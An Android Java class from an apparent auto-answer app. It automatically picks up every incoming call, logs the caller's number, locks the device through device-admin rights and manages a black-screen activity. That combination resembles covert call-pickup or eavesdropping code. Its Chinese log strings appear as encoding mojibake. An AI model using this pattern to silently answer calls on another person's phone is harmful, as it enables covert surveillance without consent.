package com.yfm.autoanswer;


import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class TelePhoneListener extends PhoneStateListener {

	public static boolean isoff=false;
	private Context context;
	private DevicePolicyManager mDPM;
	private ComponentName mDeviceComponentName;
	public TelePhoneListener(Context context) {
		this.context = context;
		mDPM = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        mDeviceComponentName = new ComponentName(context.getApplicationContext(),deviceAdminReceiver.class);
	}

	@Override
	public void onCallStateChanged(int state, String incomingNumber) {
		// TODO Auto-generated method stub
		try {
			super.onCallStateChanged(state, incomingNumber);
			Log.i("state", "µç»°×´Ì¬" + state + ",µç»°ºÅÂë" + incomingNumber);
			switch (state) {
			case TelephonyManager.CALL_STATE_RINGING:
				Log.i("phonenumber", incomingNumber);
				isoff=true;
				PhoneUtils.answerRingingCall(context,incomingNumber);
				boolean active = mDPM.isAdminActive(mDeviceComponentName);
	            if (active) {
	                mDPM.lockNow();
	            }
				break;
				
			case TelephonyManager.CALL_STATE_IDLE:
				Log.i("¹Ò¶Ï", "¹Ò¶Ï");
				if(HeipingActicity.heiping!=null){
					HeipingActicity.heiping.finish();
				}
				
				PhoneUtils.huifu(context);
				isoff=false;
				break;
			default:
				break;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}


	
	
	
      
}
